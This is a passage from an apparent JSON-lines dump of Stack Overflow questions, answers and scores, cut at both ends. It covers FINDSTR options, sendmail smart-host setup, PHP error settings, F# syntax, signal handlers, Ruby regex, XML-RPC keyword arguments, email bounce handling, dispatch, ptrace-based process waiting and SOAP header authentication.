[/C:string] [/G:file] [/D:dir list] [/A:color attributes] [/OFF[LINE]]\n        strings [[drive:][path]filename[ ...]]\n\n  /B         Matches pattern if at the beginning of a line.\n  /E         Matches pattern if at the end of a line.\n  /L         Uses search strings literally.\n  /R         Uses search strings as regular expressions.\n  /S         Searches for matching files in the current directory and all\n             subdirectories.\n  /I         Specifies that the search is not to be case-sensitive.\n  /X         Prints lines that match exactly.\n  /V         Prints only lines that do not contain a match.\n  /N         Prints the line number before each line that matches.\n  /M         Prints only the filename if a file contains a match.\n  /O         Prints character offset before each matching line.\n  /P         Skip files with non-printable characters.\n  /OFF[LINE] Do not skip files with offline attribute set.\n  /A:attr    Specifies color attribute with two hex digits. See \"color /?\"\n  /F:file    Reads file list from the specified file(/ stands for console).\n  /C:string  Uses specified string as a literal search string.\n  /G:file    Gets search strings from the specified file(/ stands for console).\n  /D:dir     Search a semicolon delimited list of directories\n  strings    Text to be searched for.\n  [drive:][path]filename\n             Specifies a file or files to search.\n\nUse spaces to separate multiple search strings unless the argument is prefixed\nwith /C.  For example, 'FINDSTR \"hello there\" x.y' searches for \"hello\" or\n\"there\" in file x.y.  'FINDSTR /C:\"hello there\" x.y' searches for\n\"hello there\" in file x.y.\n\nRegular expression quick reference:\n  .        Wildcard: any character\n  *        Repeat: zero or more occurances of previous character or class\n  ^        Line position: beginning of line\n  $        Line position: end of line\n  [class]  Character class: any one character in set\n  [^class] Inverse class: any one character not in set\n  [x-y]    Range: any characters within the specified range\n  \\x       Escape: literal use of metacharacter x\n  \\<xyz    Word position: beginning of word\n  xyz\\>    Word position: end of word\n\n", "score": 27}
{"title": "What are the semantics of a const member function?", "description": "I understand that the function is not allowed to change the state of the object, but I thought I read somewhere that the compiler was allowed to assume that if the function was called with the same arguments, it would return the same value and thus could reuse a cached value if it was available. e.g.\nclass object\n{\n    int get_value(int n) const\n    {\n        ...\n    }\n\n...\n\nobject x;\n\nint a = x.get_value(1);\n    ...\nint b = x.get_value(1);\n\nthen the compiler could optimize the second call away and either use the value in a register or simply do b = a;\nIs this true?\n", "answer": "const is about program semantics and not about implementation details. You should mark a member function const when it does not change the visible state of the object, and should be callable on an object that is itself const. Within a const member function on a class X, the type of this is X const *: pointer to constant X object. Thus all member variables are effectively const within that member function (except mutable ones). If you have a const object, you can only call const member functions on it.\nYou can use mutable to indicate that a member variable may change even within a const member function. This is typically used to identify variables used for caching results, or for variables that don't affect the actual observable state such as mutexes (you still need to lock the mutex in the const member functions) or use counters.\nclass X\n{\n    int data;\n    mutable boost::mutex m;\npublic:\n    void set_data(int i)\n    {\n        boost::lock_guard<boost::mutex> lk(m);\n        data=i;\n    }\n    int get_data() const // we want to be able to get the data on a const object\n    {\n        boost::lock_guard<boost::mutex> lk(m); // this requires m to be non-const\n        return data;\n    }\n};\n\nIf you hold the data by pointer rather than directly (including smart pointers such as std::auto_ptr or boost::shared_ptr) then the pointer becomes const in a const member function, but not the pointed-to data, so you can modify the pointed-to data.\nAs for caching: in general the compiler cannot do this because the state might change between calls (especially in my multi-threaded example with the mutex). However, if the definition is inline then the compiler can pull the code into the calling function and optimize what it can see there. This might result in the function effectively only being called once.\nThe next version of the C++ Standard (C++0x) will have a new keyword constexpr. Functions tagged constexpr return a constant value, so the results can be cached. There are limits on what you can do in such a function (in order that the compiler can verify this fact).\n", "score": 26}
{"title": "Configuring sendmail behind a firewall", "description": "I'm setting up a server which is on a network behind a firewall and I want programs on this computer to be able to use sendmail to send emails to any email address.  We have an SMTP server running on this network (let's call it mailrelay.example.com) which is how we're supposed to get outgoing emails through the firewall.\nSo how do I configure sendmail to send all mail through mailrelay.example.com?  Googling hasn't given me the answer yet, and has only revealed that sendmail configuration is extremely complex and annoying.\n", "answer": "@eli: modifying sendmail.cf directly is not usually recommended, since it is generated by the macro compiler. \nEdit /etc/mail/sendmail.mc to include the line:\n  define(`SMART_HOST',`mailrelay.example.com')dnl \n\nAfter changing the sendmail.mc macro configuration file, it must be recompiled\nto produce the sendmail configuration file.\n  # m4 /etc/mail/sendmail.mc > /etc/sendmail.cf\n\nAnd restart the sendmail service (Linux):\n  # /etc/init.d/sendmail restart\n\nAs well as setting the smarthost, you might want to also disable name resolution configuration and possibly shift your sendmail to non-standard port, or disable daemon mode.\nDisable Name Resolution\nServers that are within fire-walled networks or using Network Address\nTranslation (NAT) may not have DNS or NIS services available. This creates\na problem for sendmail, since it will use DNS by default, and if it is not\navailable you will see messages like this in mailq:\n  host map: lookup (mydomain.com): deferred)\n\nUnless you are prepared to setup an appropriate DNS or NIS service that\nsendmail can use, in this situation you will typically configure name\nresolution to be done using the /etc/hosts file. This is done by enabling\na 'service.switch' file and specifying resolution by file, as follows:\n1: Enable service.switch for sendmail\nEdit /etc/mail/sendmail.mc to include the lines:\n  define(`confSERVICE_SWITCH_FILE',`/etc/mail/service.switch')dnl\n\n2: Configure service.switch for files\nCreate or modify /etc/mail/service.switch to refer only to /etc/hosts for name\nresolution:\n  # cat /etc/mail/service.switch\n  hosts files\n\n3: Recompile sendmail.mc and restart sendmail for this setting to take effect.\nShift sendmail to non-standard port, or disable daemon mode\nBy default, sendmail will listen on port 25. You may want to change this port\nor disable the sendmail daemon mode altogether for various reasons:\n- if there is a security policy prohibiting the use of well-known ports\n- if another SMTP product/process is to be running on the same host on the standard port\n- if you don't want to accept mail via smtp at all, just send it using sendmail\n1: To shift sendmail to use non-standard port.\nEdit /etc/mail/sendmail.mc and modify the \"Port\" setting in the line:\n  DAEMON_OPTIONS(`Port=smtp,Addr=127.0.0.1, Name=MTA')\n\nFor example, to get sendmail to use port 125:\n  DAEMON_OPTIONS(`Port=125,Addr=127.0.0.1, Name=MTA')\n\nThis will require sendmail.mc to be recompiled and sendmail to be restarted.\n2: Alternatively, to disable sendmail daemon mode altogether (Linux)\nEdit /etc/sysconfig/sendmail and modify the \"DAEMON\" setting to:\n  DAEMON=no\n\nThis change will require sendmail to be restarted.\n", "score": 14}
{"title": "How can I turn on PHP errors display on just a subfolder", "description": "I don't want PHP errors to display /html, but I want them to display in /html/beta/usercomponent. Everything is set up so that errors do not display at all. How can I get errors to just show up in that one folder (and its subfolders)?\n", "answer": "In .htaccess:\nphp_value error_reporting 2147483647\n\nThis number, according to documentation should enable 'all' errors irrespective of version, if you want a more granular setting, manually OR the values together, or run \nphp -r 'echo E_ALL | E_STRICT ;'\n\nto let php compute the value for you.\nYou need \nAllowOverride All\n\nin apaches master configuration to enable .htaccess files. \nMore Reading on this can be found here: \n\nPhp/Error Reporting Flag\nPhp/Error Reporting values\nPhp/Different Ways of Tuning Settings\n\nNotice If you are using Php-CGI instead of mod_php, this may not work as advertised, and all you will get is an internal server error, and you will be left without much option other than enabling it either site-wide on a per-script basis with \nerror_reporting( E_ALL | E_STRICT ); \n\nor similar constructs before the error occurs. \nMy advice is to disable displaying errors to the user, and utilize heavily php's error_log feature. \ndisplay_errors = 0\nerror_logging = E_ALL | E_STRICT \nerror_log = /var/log/php \n\nIf you have problems with this being too noisy, this is not a sign you need to just take error reporting off selectively, this is a sign somebody should fix the code.\n\n@Roger\nYes, you can use it in a <Directory> construct in apaches configuration too, however, the .htaccess in this case is equivalent, and makes it more portable especially if you have multiple working checkout copies of the same codebase and you want to distribute this change to all of them.\nIf you have multiple virtual hosts, you'll want the construct in the respective virtual hosts definition, otherwise, yes\n  <Directory /path/to/wherever/on/filesystem> \n      <IfModule mod_php5.c>\n         php_value error_reporting 214748364\n      </IfModule>\n  </Directory>\n\nThe Additional \"ifmodule\" commands are just a safety net so the above problem with apache dying if you don't have mod_php won't occur. \n", "score": 28}
{"title": "What does -> mean in F#?", "description": "I've been trying to get into F# on and off for a while but I keep getting put off.  Why?\nBecause no matter which 'beginners' resource I try to look at I see very simple examples that start using the operator ->.\nHowever, nowhere have I found as yet that provides a clear simple explanation of what this operator means.  It's as though it must be so obvious that it doesn't need explanation even to complete newbies.\nI must therefore be really dense or perhaps it's nearly 3 decades of previous experience holding me back.\nCan someone please, explain it or point to a truly accessible resource that explains it?\n", "answer": "'->' is not an operator.  It appears in the F# syntax in a number of places, and its meaning depends on how it is used as part of a larger construct.\nInside a type, '->' describes function types as people have described above.  For example\nlet f : int -> int = ...\n\nsays that 'f' is a function that takes an int and returns an int.\nInside a lambda (\"thing that starts with 'fun' keyword\"), '->' is syntax that separates the arguments from the body.  For example\nfun x y -> x + y + 1\n\nis an expression that defines a two argument function with the given implementation.\nInside a \"match\" construct, '->' is syntax that separates patterns from the code that should run if the pattern is matched.  For example, in\nmatch someList with\n| [] -> 0\n| h::t -> 1\n\nthe stuff to the left of each '->' are patterns, and the stuff on the right is what happens if the pattern on the left was matched.\nThe difficulty in understanding may be rooted in the faulty assumption that '->' is \"an operator\" with a single meaning.  An analogy might be \".\" in C#, if you have never seen any code before, and try to analyze the \".\" operator based on looking at \"obj.Method\" and \"3.14\" and \"System.Collections\", you may get very confused, because the symbol has different meanings in different contexts.  Once you know enough of the language to recognize these contexts, however, things become clear.\n", "score": 51}
{"title": "Portable way to catch signals and report problem to the user", "description": "If by some miracle a segfault occurs in our program, I want to catch the SIGSEGV and let the user (possibly a GUI client) know with a single return code that a serious problem has occurred.  At the same time I would like to display information on the command line to show which signal was caught.\nToday our signal handler looks as follows:\nvoid catchSignal (int reason) {\n  std :: cerr << \"Caught a signal: \" << reason << std::endl;\n  exit (1);\n}\n\nI can hear the screams of horror with the above, as I have read from this thread that it is evil to call a non-reentrant function from a signal handler.\nIs there a portable way to handle the signal and provide information to users?\nEDIT: Or at least portable within the POSIX framework?\n", "answer": "This table lists all of the functions that POSIX guarantees to be async-signal-safe and so can be called from a signal handler.\nBy using the 'write' command from this table, the following relatively \"ugly\" solution hopefully will do the trick:\n#include <csignal>\n\n#ifdef _WINDOWS_\n#define _exit _Exit\n#else\n#include <unistd.h>\n#endif\n\n#define PRINT_SIGNAL(X) case X: \\\n          write (STDERR_FILENO, #X \")\\n\" , sizeof(#X \")\\n\")-1); \\\n          break;\n\nvoid catchSignal (int reason) {\n  char s[] = \"Caught signal: (\";\n  write (STDERR_FILENO, s, sizeof(s) - 1);\n  switch (reason)\n  {\n    // These are the handlers that we catch\n    PRINT_SIGNAL(SIGUSR1);\n    PRINT_SIGNAL(SIGHUP);\n    PRINT_SIGNAL(SIGINT);\n    PRINT_SIGNAL(SIGQUIT);\n    PRINT_SIGNAL(SIGABRT);\n    PRINT_SIGNAL(SIGILL);\n    PRINT_SIGNAL(SIGFPE);\n    PRINT_SIGNAL(SIGBUS);\n    PRINT_SIGNAL(SIGSEGV);\n    PRINT_SIGNAL(SIGTERM);\n  }\n\n  _Exit (1);  // 'exit' is not async-signal-safe\n}\n\nEDIT: Building on windows.\nAfter trying to build this one windows, it appears that 'STDERR_FILENO' is not defined.  From the documentation however its value appears to be '2'.\n#include <io.h>\n#define STDIO_FILENO 2\n\nEDIT: 'exit' should not be called from the signal handler either!\nAs pointed out by fizzer, calling _Exit in the above is a sledge hammer approach for signals such as HUP and TERM.  Ideally, when these signals are caught a flag with \"volatile sig_atomic_t\" type can be used to notify the main program that it should exit.\nThe following I found useful in my searches.\n\nIntroduction To Unix Signals Programming \nExtending Traditional Signals\n\n", "score": 12}
{"title": "ASP.NET Framework effects of moving from 2.0 to 3.5?", "description": "I've started using Visual Studio 2008 and it keeps asking me to upgrade my 2.0 website project to 3.5 every time it opens. \n\nWhat effectively happens when I \"upgrade\" a website project from 2.0 to 3.5 in Visual Studio? \nDoes it update my web.config? How exactly does it change my project/website/code? \nIs there a potential for any 2.0 methods/settings to BREAK upon upgrade to 3.5? \nAre there any gotchas involved?\n\n", "answer": "(As mentioned elsewhere across the other answers, plus some extras:)\n\nConverting a VS 2005 solution to VS 2008 will mean that you'll need to maintain duplicates, or others must also be using Visual Studio 2008 (while the project file format (which from your question you're not using anyway) is in theory unchanged between 2005 and 2008, the solution files are not compatible...)\nConverting the website to 3.5 mostly affects the web.config.  Some references are added to a few default 3.5 assemblies, such as System.Core.dll.  And it will add the IIS 7 sections (which is all ignored if the site is published to an IIS6 box).\nGenerally don't see new compile time errors from the upgrade (and if you do, wouldn't expect many). Both the C# and VB teams have put effort into ensuring backwards compatibility on all the new LINQ keywords... so you can have a local named \"var\" in a method named \"where\" in a class named \"from\" and everything compiles just fine...  (an improvement for anyone who had symbols named \"operator\" in a VB 2003 codebase when upgrading to 2005 :-)\nObviously, once you've switched, you'll need .NET 3.5 on any server you deploy to.  Unlike .NET 1.1 vs .NET 2.0 though, there are no CLR version / AppPool issues to worry about, it all runs in .NET 2.0.  Read on below...\n\nIf you are worried about run-time regression for any existing .NET 2.0 code, there's good news and bad news.\nThe good news:  regression is virtually unheard of.  \nThe bad (or other good) news:  If you've installed .NET 3.5 on a server running 2.0 sites, you've already tested for regressions :)\nAs mentioned above, .NET 3.5 is really just the .NET 2.0 CLR with some extra assemblies and new compiler functionality.\nAnd when you install .NET 3.5, it also installs a service pack for .NET 2.0 and 3.0.  So any breaking change would already be affecting .NET 2.0 websites, without any explicit upgrade step.\nScott Hanselman posted a good explanation of the difference between CLR version and .NET Runtime version here a while back.\nOne final comment - you should be aware that when using VS 2008 to target .NET 2.0, you are actually compiling against the updated .NET 2.0.  So if you use one of the (very few, and rarely used) methods quietly added to the updated version of .NET 2.0, such as GCSettings.LatencyMode, when you deploy to a machine that has the original .NET 2.0 RTM, it will fail to run.\n Read about it in more detail here, and Scott also posted a full list of API changes here)\nWhile actually encountering an issue like this is pretty unlikely, in some ways (even excluding the benefits of the new 3.5 features) you're better off on 3.5 :-)   \n", "score": 10}
{"title": "gsub partial replace", "description": "I would like to replace only the group in parenthesis in this expression :\nmy_string.gsub(/<--MARKER_START-->(.)*<--MARKER_END-->/, 'replace_text')\n\nso that I get : <--MARKER_START-->replace_text<--MARKER_END-->\nI know I could repeat the whole MARKER_START and MARKER_END blocks in the substitution expression but I thought there should be a more simple way to do this.\n", "answer": "You can do it with zero width look-ahead and look-behind assertions.\nThis regex should work in ruby 1.9 and in perl and many other places:\nNote: ruby 1.8 only supports look-ahead assertions. You need both look-ahead and look-behind to do this properly.\n s.gsub( /(?<=<--MARKER START-->).*?(?=<--MARKER END-->)/, 'replacement text' )\n\nWhat happens in ruby 1.8 is the ?<= causes it to crash because it doesn't understand the look-behind assertion. For that part, you then have to fall back to using a backreference - like Greig Hewgill mentions\nso what you get is\n s.gsub( /(<--MARKER START-->).*?(?=<--MARKER END-->)/, '\\1replacement text' )\n\nEXPLANATION THE FIRST:\nI've replaced the (.)* in the middle of your regex with .*? - this is non-greedy.\nIf you don't have non-greedy, then your regex will try and match as much as it can - if you have 2 markers on one line, it goes wrong. This is best illustrated by example:\n\"<b>One</b> Two <b>Three</b>\".gsub( /<b>.*<\\/b>/, 'BOLD' )\n=> \"BOLD\"\n\nWhat we actually want:\n\"<b>One</b> Two <b>Three</b>\".gsub( /<b>.*?<\\/b>/, 'BOLD' )\n=> \"BOLD Two BOLD\"\n\nEXPLANATION THE SECOND:\nzero-width-look-ahead-assertion sounds like a giant pile of nerdly confusion.\nWhat \"look-ahead-assertion\" actually means is \"Only match, if the thing we are looking for, is followed by this other stuff.\nFor example, only match a digit, if it is followed by an F.\n\"123F\" =~ /\\d(?=F)/ # will match the 3, but not the 1 or the 2\n\nWhat \"zero width\" actually means is \"consider the 'followed by' in our search, but don't count it as part of the match when doing replacement or grouping or things like that.\nUsing the same example of 123F, If we didn't use the lookahead assertion, and instead just do this:\n\"123F\" =~ /\\dF/ # will match 3F, because F is considered part of the match\n\nAs you can see, this is ideal for checking for our <--MARKER END-->, but what we need for the <--MARKER START--> is the ability to say \"Only match, if the thing we are looking for FOLLOWS this other stuff\". That's called a look-behind assertion, which ruby 1.8 doesn't have for some strange reason..\nHope that makes sense :-)\nPS: Why use lookahead assertions instead of just backreferences? If you use lookahead, you're not actually replacing the <--MARKER--> bits, only the contents. If you use backreferences, you are replacing the whole lot. I don't know if this incurs much of a performance hit, but from a programming point of view it seems like the right thing to do, as we don't actually want to be replacing the markers at all.\n", "score": 16}
{"title": "Add row while assigning datasource for datagridview", "description": "I have a datagridview assigned a datasource to it. now how to add a new row to that grid and remove a row from it?\n", "answer": "One way to do this is as follows:\nStep #1 Setup the Data Adapter, Data Grid etc:\n// the data grid\nDataGridView dataGrid;\n\n// create a new data table\nDataTable table = new DataTable();\n\n// create the data adapter\nSqlDataAdapter dataAdapter = new SqlDataAdapter(strSQL, strDSN);\n\n// populate the table using the SQL adapter\ndataAdapter.Fill(table);\n\n// bind the table to a data source\nBindingSource dbSource = new BindingSource();\ndbSource.DataSource = table;\n\n// finally bind the data source to the grid\ndataGrid.DataSource = dbSource;\n\nStep #2 Setup the Data Adapter SQL Commands:\nThese SQL commands define how to move the data between the grid and the database via the adapter.\ndataAdapter.DeleteCommand = new SqlCommand(...);\n\ndataAdapter.InsertCommand = new SqlCommand(...);\n\ndataAdapter.UpdateCommand = new SqlCommand(...);\n\nStep #3 Code to Remove Select lines from the Data Grid:\npublic int DeleteSelectedItems()\n{\n    int itemsDeleted = 0;\n\n    int count = dataGrid.RowCount;\n\n    for (int i = count - 1; i >=0; --i)\n    {\n        DataGridViewRow row = dataGrid.Rows[i];\n\n        if (row.Selected == true)\n        {\n            dataGrid.Rows.Remove(row);\n\n            // count the item deleted\n            ++itemsDeleted;\n        }\n    }\n\n    // commit the deletes made\n    if (itemsDeleted > 0) Commit();\n}\n\nStep #4 Handling Row Inserts and Row Changes:\nThese types of changes are relatively easy to implement as you can let the grid manage the cell changes and new row inserts. \nThe only thing you will have to decide is when do you commit these changes. \nI would recomment putting the commit in the RowValidated event handler of the DataGridView as at that point you should have a full row of data.\nStep #5 Commit Method to Save the Changes back to the Database:\nThis function will handle all the pending updates, insert and deletes and move these changes from the grid back into the database.\npublic void Commit()\n{\n    SqlConnection cn = new SqlConnection();\n\n    cn.ConnectionString = \"Do the connection using a DSN\";\n\n    // open the connection\n    cn.Open();\n\n    // commit any data changes\n    dataAdapter.DeleteCommand.Connection = cn;\n    dataAdapter.InsertCommand.Connection = cn;\n    dataAdapter.UpdateCommand.Connection = cn;\n    dataAdapter.Update(table);\n    dataAdapter.DeleteCommand.Connection = null;\n    dataAdapter.InsertCommand.Connection = null;\n    dataAdapter.UpdateCommand.Connection = null;\n\n    // clean up\n    cn.Close();\n}\n\n", "score": 10}
{"title": "Using **kwargs with SimpleXMLRPCServer in python", "description": "I have a class that I wish to expose as a remote service using pythons SimpleXMLRPCServer. The server startup looks like this:\nserver = SimpleXMLRPCServer((serverSettings.LISTEN_IP,serverSettings.LISTEN_PORT))\n\nservice = Service()\n\nserver.register_instance(service)\nserver.serve_forever()\n\nI then have a ServiceRemote class that looks like this:\ndef __init__(self,ip,port):\n    self.rpcClient = xmlrpclib.Server('http://%s:%d' %(ip,port))\n\ndef __getattr__(self, name):\n    # forward all calls to the rpc client\n    return getattr(self.rpcClient, name)\n\nSo all calls on the ServiceRemote object will be forwarded to xmlrpclib.Server, which then forwards it to the remote server. The problem is a method in the service that takes named varargs:\n@useDb\ndef select(self, db, fields, **kwargs):\n    pass\n\nThe @useDb decorator wraps the function, creating the db before the call and opening it, then closing it after the call is done before returning the result.\nWhen I call this method, I get the error \"call() got an unexpected keyword argument 'name'\". So, is it possible to call methods taking variable named arguments remotely? Or will I have to create an override for each method variation I need.\n\nThanks for the responses. I changed my code around a bit so the question is no longer an issue. However now I know this for future reference if I indeed do need to implement positional arguments and support remote invocation. I think a combination of Thomas and praptaks approaches would be good. Turning kwargs into positional args on the client through xmlrpclient, and having a wrapper on methods serverside to unpack positional arguments.\n", "answer": "You can't do this with plain xmlrpc since it has no notion of keyword arguments. However, you can superimpose this as a protocol on top of xmlrpc that would always pass a list as first argument, and a dictionary as a second, and then provide the proper support code so this becomes transparent for your usage, example below:\nServer\nfrom SimpleXMLRPCServer import SimpleXMLRPCServer\n\nclass Server(object):\n    def __init__(self, hostport):\n        self.server = SimpleXMLRPCServer(hostport)\n\n    def register_function(self, function, name=None):\n        def _function(args, kwargs):\n            return function(*args, **kwargs)\n        _function.__name__ = function.__name__\n        self.server.register_function(_function, name)\n\n    def serve_forever(self):\n        self.server.serve_forever()\n\n#example usage\nserver = Server(('localhost', 8000))\ndef test(arg1, arg2):\n    print 'arg1: %s arg2: %s' % (arg1, arg2)\n    return 0\nserver.register_function(test)\nserver.serve_forever()\n\nClient\nimport xmlrpclib\n\nclass ServerProxy(object):\n    def __init__(self, url):\n        self._xmlrpc_server_proxy = xmlrpclib.ServerProxy(url)\n    def __getattr__(self, name):\n        call_proxy = getattr(self._xmlrpc_server_proxy, name)\n        def _call(*args, **kwargs):\n            return call_proxy(args, kwargs)\n        return _call\n\n#example usage\nserver = ServerProxy('http://localhost:8000')\nserver.test(1, 2)\nserver.test(arg2=2, arg1=1)\nserver.test(1, arg2=2)\nserver.test(*[1,2])\nserver.test(**{'arg1':1, 'arg2':2})\n\n", "score": 15}
{"title": "Handling undelivered emails in webapp", "description": "We have a typical business web app that allows our users to send e-mails with offerings to their clients. We set user e-mail in FROM field so the client can reply directly to the user. The problem is that because of SMTP protocol, undelivered e-mail notification is returned to our e-mail address(the address of the account we send e-mails from). \nDo you know elegant way to handle this undelivered emails? I mean the easiest way to let the sender know that his mail was not delivered.\n", "answer": "First, it's important to understand the difference between the \"From:\" header (which the  recipient sees in their email client) and the sender address (which is also called the envelope return path, or the argument to the SMTP \"MAIL FROM\" command). The sender address is where bounce messages go when the email can't be delivered, hence the other name return path.\nSMTP doesn't restrict what address you use as the sender address (except that it must by syntactically valid), but whatever SMTP client library you use might, so you'll need to check that out.\nChanging the sender address is where you can do clever things to help detect email bounces and report them back to the webapp or sender.  The most common thing you'll see is to encode the recipient address in the sender address, e.g. with a sender address like this: sender+recipient=recipientdomain.com@senderdomain.com. The MTA responsible for senderdomain.com needs to know to deliver all emails for sender+foo@senderdomain.com to sender@senderdomain.com -- but that's a fairly common requirement. Then you take the email that is received, and instead of trying to work out from the bounce message in the contents (which could be in any format) who the recipient was, you can get it right from the recipient address.\nYou can do more complex things as well, like hashing the recipient address so it's not visible directly in the sender address, e.g. sender+e72fab38fb@senderdomain.com.  And you could include some identifier for the email that was sent, in case you're sending multiple emails to the same address and want to know which one bounced.\nThese tricks are called Variable Envelope Return Path or VERP, and are commonly implemented by mailing list software.\n", "score": 19}
{"title": "What's the difference between Polymorphism and Multiple Dispatch?", "description": "...or are they the same thing? I notice that each has its own Wikipedia entry: Polymorphism, Multiple Dispatch, but I'm having trouble seeing how the concepts differ.\nEdit: And how does Overloading fit into all this?\n", "answer": "Polymorphism is the facility that allows a language/program to make decisions during runtime on which method to invoke based on the types of the parameters sent to that method. \nThe number of parameters used by the language/runtime determines the 'type' of polymorphism supported by a language. \nSingle dispatch is a type of polymorphism where only one parameter is used (the receiver of the message - this, or self) to determine the call.\nMultiple dispatch is a type of polymorphism where in multiple parameters are used in determining which method to call. In this case, the reciever as well as the types of the method parameters are used to tell which method to invoke.\nSo you can say that polymorphism is the general term and multiple and single dispatch are specific types of polymorphism.\nAddendum: Overloading happens during compile time. It uses the type information available during compilation to determine which type of method to call. Single/multiple dispatch happens during runtime.\nSample code:\nusing NUnit.Framework;\n\nnamespace SanityCheck.UnitTests.StackOverflow\n{\n    [TestFixture]\n    public class DispatchTypes\n    {\n        [Test]\n        public void Polymorphism()\n        {\n            Baz baz = new Baz();\n            Foo foo = new Foo();\n\n            // overloading - parameter type is known during compile time\n            Assert.AreEqual(\"zap object\", baz.Zap(\"hello\"));\n            Assert.AreEqual(\"zap foo\", baz.Zap(foo));\n\n            // virtual call - single dispatch. Baz is used.\n            Zapper zapper = baz;\n            Assert.AreEqual(\"zap object\", zapper.Zap(\"hello\"));\n            Assert.AreEqual(\"zap foo\", zapper.Zap(foo));\n\n            // C# has doesn't support multiple dispatch so it doesn't\n            // know that oFoo is actually of type Foo.\n            //\n            // In languages with multiple dispatch, the type of oFoo will \n            // also be used in runtime so Baz.Zap(Foo) will be called\n            // instead of Baz.Zap(object)\n            object oFoo = foo;\n            Assert.AreEqual(\"zap object\", zapper.Zap(oFoo));\n        }\n\n        public class Zapper\n        {\n            public virtual string Zap(object o) { return \"generic zapper\" ; }\n            public virtual string Zap(Foo f) { return \"generic zapper\"; }\n        }\n\n        public class Baz : Zapper\n        {\n            public override string Zap(object o) { return \"zap object\"; }\n            public override string Zap(Foo f) { return \"zap foo\"; }\n        }\n\n        public class Foo { }\n    }\n}\n\n", "score": 55}
{"title": "How do I write a program that tells when my other program ends?", "description": "How do I write a program that tells when my other program ends?\n", "answer": "The only way to do a waitpid() or waitid() on a program that isn't spawned by yourself is to become its parent by ptrace'ing it.\nHere is an example of how to use ptrace on a posix operating system to temporarily become another processes parent, and then wait until that program exits. As a side effect you can also get the exit code, and the signal that caused that program to exit.:\n#include <sys/ptrace.h>\n#include <errno.h>\n#include <stdio.h>\n#include <signal.h>\n#include <unistd.h>\n#include <sys/wait.h>\n\nint main(int argc, char** argv) {\n\n    int pid = atoi(argv[1]);\n    int status;\n    siginfo_t si;\n\n    switch (ptrace(PTRACE_ATTACH, pid, NULL)) {\n        case 0:\n            break;\n        case -ESRCH:\n        case -EPERM:\n            return 0;\n        default:\n            fprintf(stderr, \"Failed to attach child\\n\");\n            return 1;\n    }\n    if (pid != wait(&status)) {\n        fprintf(stderr, \"wrong wait signal\\n\");\n        return 1;\n    }\n    if (!WIFSTOPPED(status) || (WSTOPSIG(status) != SIGSTOP))  {\n        /* The pid might not be running */\n        if (!kill(pid, 0)) {\n            fprintf(stderr, \"SIGSTOP didn't stop child\\n\");\n            return 1;\n        } else {\n            return 0;\n        }\n    }\n    if (ptrace(PTRACE_CONT, pid, 0, 0)) {\n        fprintf(stderr, \"Failed to restart child\\n\");\n        return 1;\n    }\n\n    while (1) {\n        if (waitid(P_PID, pid, &si, WSTOPPED | WEXITED)) {\n            // an error occurred.\n            if (errno == ECHILD)\n                return 0;\n            return 1;\n        }\n        errno = 0;\n\n        if (si.si_code & (CLD_STOPPED | CLD_TRAPPED)) {\n            /* If the child gets stopped, we have to PTRACE_CONT it\n             * this will happen when the child has a child that exits.\n             **/\n            if (ptrace(PTRACE_CONT, pid, 1, si.si_status)) {\n                if (errno == ENOSYS) {\n                    /* Wow, we're stuffed. Stop and return */\n                    return 0;\n                }\n            }\n            continue;\n        }\n\n        if (si.si_code & (CLD_EXITED | CLD_KILLED | CLD_DUMPED)) {\n            return si.si_status;\n        }\n        // Fall through to exiting.\n        return 1;\n    }\n}\n\n", "score": 11}
{"title": "Call a certain method before each webservice call", "description": "Here's the situation. I have a webservice (C# 2.0), which consists of (mainly) a class inheriting from System.Web.Services.WebService. It contains a few methods, which all need to call a method that checks if they're authorized or not.\nBasically something like this (pardon the architecture, this is purely as an example):  \npublic class ProductService : WebService\n{\n    public AuthHeader AuthenticationHeader;\n\n    [WebMethod(Description=\"Returns true\")]\n    [SoapHeader(\"AuthenticationHeader\")]        \n    public bool MethodWhichReturnsTrue()\n    {\n        if(Validate(AuthenticationHeader))\n        {\n            throw new SecurityException(\"Access Denied\");\n        }\n        return true;\n    }\n\n    [WebMethod(Description=\"Returns false\")]\n    [SoapHeader(\"AuthenticationHeader\")]        \n    public bool MethodWhichReturnsFalse()\n    {\n        if(Validate(AuthenticationHeader))\n        {\n            throw new SecurityException(\"Access Denied\");\n        }\n        return false;\n    }\n\n    private bool Validate(AuthHeader authHeader)\n    {\n        return authHeader.Username == \"gooduser\" && authHeader.Password == \"goodpassword\";\n    }\n}\n\nAs you can see, the method Validate has to be called in each method. I'm looking for a way to be able to call that method, while still being able to access the soap headers in a sane way. I've looked at the events in the global.asax, but I don't think I can access the headers in that class... Can I?\n", "answer": "Here is what you need to do to get this to work correctly.\nIt is possible to create your own custom SoapHeader:\npublic class ServiceAuthHeader : SoapHeader\n{\n    public string SiteKey;\n    public string Password;\n\n    public ServiceAuthHeader() {}\n}\n\nThen you need a SoapExtensionAttribute:\npublic class AuthenticationSoapExtensionAttribute : SoapExtensionAttribute\n{\n    private int priority;\n\n    public AuthenticationSoapExtensionAttribute()\n    {\n    }\n\n    public override Type ExtensionType\n    {\n        get\n        {\n            return typeof(AuthenticationSoapExtension);\n        }\n    }\n\n    public override int Priority\n    {\n        get\n        {\n            return priority;\n        }\n        set\n        {\n            priority = value;\n        }\n    }\n}\n\nAnd a custom SoapExtension:\npublic class AuthenticationSoapExtension : SoapExtension\n{\n    private ServiceAuthHeader authHeader;\n\n    public AuthenticationSoapExtension()\n    {\n    }\n\n    public override object GetInitializer(Type serviceType)\n    {\n        return null;\n    }\n\n    public override object GetInitializer(LogicalMethodInfo methodInfo, SoapExtensionAttribute attribute)\n    {\n        return null;\n    }\n\n    public override void Initialize(object initializer)\n    {        \n    }\n\n    public override void ProcessMessage(SoapMessage message)\n    {\n        if (message.Stage == SoapMessageStage.AfterDeserialize)\n        {\n            foreach (SoapHeader header in message.Headers)\n            {\n                if (header is ServiceAuthHeader)\n                {\n                    authHeader = (ServiceAuthHeader)header;\n\n                    if(authHeader.Password == TheCorrectUserPassword)\n                    {\n                        return;  //confirmed\n                    }\n                }\n            }\n\n            throw new SoapException(\"Unauthorized\", SoapException.ClientFaultCode);\n        }\n    }\n}\n\nThen, in your web service add the following header to your method:\npublic ServiceAuthHeader AuthenticationSoapHeader;\n\n[WebMethod]\n[SoapHeader(\"AuthenticationSoapHeader\")]\n[AuthenticationSoapExtension]\npublic string GetSomeStuffFromTheCloud(string IdOfWhatYouWant)\n{\n  return WhatYouWant;\n}\n\nWhen you consume this service, you must instantiate the custom header with the correct values and attach it to the request:\nprivate ServiceAuthHeader header;\nprivate PublicService ps;\n\nheader = new ServiceAuthHeader();\nheader.SiteKey = 